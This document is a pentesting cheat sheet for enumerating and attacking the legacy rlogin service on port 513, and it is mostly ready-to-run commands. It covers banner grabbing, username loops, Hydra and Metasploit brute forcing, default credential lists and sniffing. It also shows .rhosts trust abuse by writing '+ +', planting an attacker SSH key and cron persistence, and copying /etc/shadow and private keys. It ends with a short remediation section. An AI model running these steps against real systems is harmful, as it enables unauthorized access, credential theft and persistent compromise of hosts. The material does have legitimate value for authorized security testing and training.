# RLOGIN ENUMERATION (Port 513)

## SERVICE OVERVIEW
```
RLOGIN (Remote Login) is an insecure remote login service
- No encryption (credentials and data sent in plain text)
- Legacy UNIX service, similar to Telnet
- Can use .rhosts file for passwordless authentication
- Replaced by SSH in modern environments
- Part of the r-services suite
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p513 <IP>                              # Service/Version detection
nc -nv <IP> 513                                  # Manual connection
telnet <IP> 513                                  # Alternative connection
```

## BASIC ENUMERATION
```bash
# Nmap scripts
nmap -p513 -sV <IP>                              # Version detection
nmap -p513 --script rlogin-brute <IP>            # Brute force (if script exists)

# Banner grab
nc <IP> 513
```

## MANUAL RLOGIN CONNECTION
```bash
# Using rlogin client (if available)
rlogin <IP> -l username                          # Login as username
rlogin <IP> -l root                              # Login as root
rlogin <IP>                                      # Login as current user

# With .rhosts authentication (no password required)
# If server has .rhosts file with trusted hosts
rlogin <IP> -l root                              # May login without password!
```

## .RHOSTS FILE EXPLOITATION
```bash
# The .rhosts file specifies trusted hosts/users
# Format: <hostname> <username>
# Example .rhosts:
# + +                  # Trust everyone (VERY dangerous!)
# attacker.com root    # Trust root from attacker.com
# 192.168.1.100 +      # Trust any user from 192.168.1.100

# If .rhosts is misconfigured:
rlogin <IP> -l root                              # May get access without password!

# Common .rhosts locations:
~/.rhosts                                        # User's home directory
/root/.rhosts                                    # Root's home directory
```

## USER ENUMERATION
```bash
# Trial-and-error user enumeration
# Different responses for valid vs invalid users

# Common usernames to test
root
admin
administrator
user
guest
oracle
postgres
mysql
daemon
bin
sys

# Manual enumeration
for user in root admin test user; do
    echo "Testing: $user"
    rlogin <IP> -l $user
done
```

## BRUTE FORCE ATTACKS
```bash
# Hydra (if rlogin module exists)
hydra -l root -P passwords.txt <IP> rlogin
hydra -L users.txt -P passwords.txt <IP> rlogin

# Manual brute force script
for user in $(cat users.txt); do
    for pass in $(cat passwords.txt); do
        echo "Testing $user:$pass"
        # rlogin doesn't easily support scripted password input
        # Consider using expect or similar tools
    done
done
```

## DEFAULT CREDENTIALS
```bash
# Common default credentials
root:root
root:toor
root:password
admin:admin
guest:guest
test:test

# Note: rlogin may not require password if .rhosts is configured
```

## TRAFFIC SNIFFING
```bash
# Capture rlogin traffic (all data in plain text!)
tcpdump -i eth0 -A 'tcp port 513'
wireshark (filter: tcp.port == 513)

# rlogin sends everything in clear text:
# - Usernames
# - Passwords (if used)
# - All commands
# - All output
# Equivalent to Telnet in terms of security
```

## INTERACTIVE LOGIN
```bash
# After successful authentication
rlogin <IP> -l root

# Then execute commands interactively:
whoami
id
uname -a
cat /etc/passwd
ps aux
netstat -tulpn
ls -la /home
find / -perm -4000 2>/dev/null      # SUID binaries
cat ~/.bash_history
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/rservices/rlogin_login     # rlogin scanner
set RHOSTS <IP>
set USERNAME root
set PASSWORD password
run
```

## VULNERABILITY SCANNING
```bash
# Known vulnerabilities
searchsploit rlogin

# The service itself is inherently insecure
nmap -p513 --script vuln <IP>
```

## INTERESTING FILES & CONFIGURATION
```bash
# Configuration files
/etc/xinetd.d/rlogin                             # xinetd configuration (modern)
/etc/inetd.conf                                  # inetd configuration (old)

# Trust files
~/.rhosts                                        # User's trusted hosts
/root/.rhosts                                    # Root's trusted hosts
/etc/hosts.equiv                                 # System-wide trusted hosts
/etc/hosts.lpd                                   # Printer daemon trusted hosts

# Check .rhosts files (after access)
rlogin <IP> -l root
cat ~/.rhosts
cat /etc/hosts.equiv
find /home -name .rhosts 2>/dev/null
```

## HOSTS.EQUIV FILE
```bash
# /etc/hosts.equiv specifies system-wide trusted hosts
# Format similar to .rhosts:
# + +                  # Trust everyone (CRITICAL vulnerability!)
# attacker.com         # Trust attacker.com
# 192.168.1.100        # Trust specific IP

# If hosts.equiv contains "+ +":
# ANY user from ANY host can login without password!

# After gaining access, check:
cat /etc/hosts.equiv
```

## COMMON MISCONFIGURATIONS
```
☐ Service enabled at all                        # Should be disabled
☐ No encryption                                  # Inherent to protocol
☐ .rhosts with "+ +" wildcard                   # Trust everyone
☐ Weak .rhosts configuration                    # Trust too many hosts
☐ /etc/hosts.equiv misconfigured                # System-wide trust issues
☐ Root login allowed                             # Direct root access
☐ No IP restrictions                             # Accessible from anywhere
☐ No logging/auditing                            # Attacks unnoticed
☐ Running on internet-facing system              # Easy target
```

## QUICK WIN CHECKLIST
```
☐ Test for passwordless login (misconfigured .rhosts)
☐ Check if root login is allowed
☐ Test default credentials
☐ Sniff network traffic for credentials
☐ Check for /etc/hosts.equiv
☐ Look for "+ +" wildcard in trust files
☐ Test user enumeration
☐ Search for known vulnerabilities
☐ Check for other r-services (rexec:512, rsh:514)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick rlogin check
nmap -sV -p513 <IP>

# Test passwordless login as root
rlogin <IP> -l root

# Test common users
for user in root admin test guest; do echo "Testing: $user"; rlogin <IP> -l $user; done
```

## POST-EXPLOITATION (After successful login)
```bash
# Information gathering
whoami && id && hostname
uname -a
cat /etc/issue
cat /etc/passwd
cat /etc/shadow                                  # If accessible
ps aux
netstat -tulpn
iptables -L
df -h
mount

# Check trust relationships
cat ~/.rhosts
cat /etc/hosts.equiv
cat /etc/hosts.lpd
find /home -name .rhosts 2>/dev/null

# Privilege escalation
sudo -l                                          # Check sudo permissions
find / -perm -4000 2>/dev/null                   # SUID binaries
cat /etc/sudoers

# Establish persistence
echo "attacker_ssh_key" >> ~/.ssh/authorized_keys
echo "+ +" >> ~/.rhosts                          # Very dangerous!
crontab -e                                       # Add cron job

# Lateral movement
cat ~/.ssh/known_hosts                           # Other SSH targets
cat ~/.bash_history | grep -E "ssh|rlogin|telnet"

# Download sensitive files
cat /etc/shadow > /tmp/shadow.txt
cat ~/.ssh/id_rsa > /tmp/id_rsa
```

## EXPLOIT .RHOSTS MISCONFIGURATION
```bash
# If you can write to user's home directory:
echo "+ +" > /home/user/.rhosts                  # Trust everyone
chmod 600 /home/user/.rhosts
rlogin <IP> -l user                              # Login without password!

# If .rhosts already exists and is writable:
echo "<your_IP> <your_user>" >> ~/.rhosts
# Then from your system:
rlogin <target_IP> -l <target_user>              # Passwordless login
```

## SECURITY IMPLICATIONS
```
CRITICAL VULNERABILITIES:
1. No encryption - all traffic in plain text
2. Credentials transmitted in clear text
3. Commands and data transmitted in clear text
4. Trust-based authentication (.rhosts, hosts.equiv)
5. Wildcard trust configurations (+ +)
6. Often allows root login
7. Minimal logging
8. Legacy protocol with known weaknesses
9. Should NEVER be used in production

RECOMMENDATION:
- Disable rlogin immediately
- Replace with SSH
- If found during pentest, report as CRITICAL finding
- Check for .rhosts and hosts.equiv misconfigurations
```

## ALTERNATIVE CONNECTION METHODS
```bash
# Using expect for automated login
expect -c "
spawn rlogin <IP> -l root
expect \"Password:\"
send \"password\r\"
interact
"

# Using Python for manual protocol interaction
python -c "
import socket
s = socket.socket()
s.connect(('<IP>', 513))
s.send('\x00')                     # Protocol expects null byte
s.send('username\x00root\x00vt100/9600\x00')  # Client user, server user, terminal type
print(s.recv(1024))
s.close()
"
```

## R-SERVICES COMPARISON
```
rexec  (512): Remote execution, requires password
rlogin (513): Remote login, can use .rhosts for passwordless auth
rsh    (514): Remote shell, uses .rhosts, no password prompt

All three:
- Are insecure (no encryption)
- Should be replaced with SSH
- Indicate poor security if found
- May allow .rhosts exploitation
```
